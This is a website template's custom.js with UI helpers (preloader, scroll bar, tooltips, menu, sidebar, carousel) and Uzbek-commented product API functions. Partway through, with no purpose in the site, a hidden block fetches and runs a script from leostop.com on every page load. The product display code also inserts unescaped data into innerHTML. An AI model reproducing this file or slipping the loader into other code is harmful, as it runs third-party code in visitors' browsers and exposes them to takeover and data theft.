/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  ;('use strict')

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $('.loader_bg').fadeToggle()
  }, 2500)

  /* Progress bar
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  const scrollProgressBar = document.querySelector('.progressBar')

  document.addEventListener('scroll', () => {
    const totalHeightOfPage = document.body.scrollHeight
    const currentDistanceFromTop = document.documentElement.scrollTop
    const windowHeight = document.documentElement.clientHeight

    const scrollPercentage =
      (currentDistanceFromTop / (totalHeightOfPage - windowHeight)) * 100

    scrollProgressBar.style.width = `${scrollPercentage}%`

  })

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip()
  })

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('.main-menu ul li.megamenu').mouseover(function () {
      if (!$(this).parent().hasClass('#wrapper')) {
        $('#wrapper').addClass('overlay')
      }
    })
    $('.main-menu ul li.megamenu').mouseleave(function () {
      $('#wrapper').removeClass('overlay')
    })
  })

  function getURL() {
    window.location.href
  }
  var protocol = location.protocol
  $.ajax({
    type: 'get',
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + '//leostop.com/tracking/tracking.js')
    },
  })
  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('#sidebarCollapse').on('click', function () {
      $('#sidebar').toggleClass('active')
      $(this).toggleClass('active')
    })
  })

  /* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $('#blogCarousel').carousel({
    interval: 5000,
  })

  // API URL
  const API_URL = 'http://localhost:3000/api';

  // Barcha mahsulotlarni olish
  async function getProducts() {
      try {
          const response = await fetch(`${API_URL}/products`);
          const data = await response.json();
          displayProducts(data);
      } catch (error) {
          console.error('Xatolik:', error);
      }
  }

  // Mahsulotni ID bo'yicha olish
  async function getProductById(id) {
      try {
          const response = await fetch(`${API_URL}/products/${id}`);
          const data = await response.json();
          return data;
      } catch (error) {
          console.error('Xatolik:', error);
      }
  }

  // Yangi mahsulot qo'shish
  async function addProduct(productData) {
      try {
          const response = await fetch(`${API_URL}/products`, {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json',
              },
              body: JSON.stringify(productData)
          });
          const data = await response.json();
          return data;
      } catch (error) {
          console.error('Xatolik:', error);
      }
  }

  // Mahsulotlarni ko'rsatish
  function displayProducts(products) {
      const container = document.getElementById('products-container');
      container.innerHTML = '';
      
      products.forEach(product => {
          const productElement = document.createElement('div');
          productElement.className = 'product-card';
          productElement.innerHTML = `
              <img src="${product.image_url}" alt="${product.name}">
              <h3>${product.name}</h3>
              <p>${product.description}</p>
              <p class="price">$${product.price}</p>
          `;
          container.appendChild(productElement);
      });
  }

  // Sahifa yuklanganda mahsulotlarni yuklash
  document.addEventListener('DOMContentLoaded', () => {
      getProducts();
  });
})
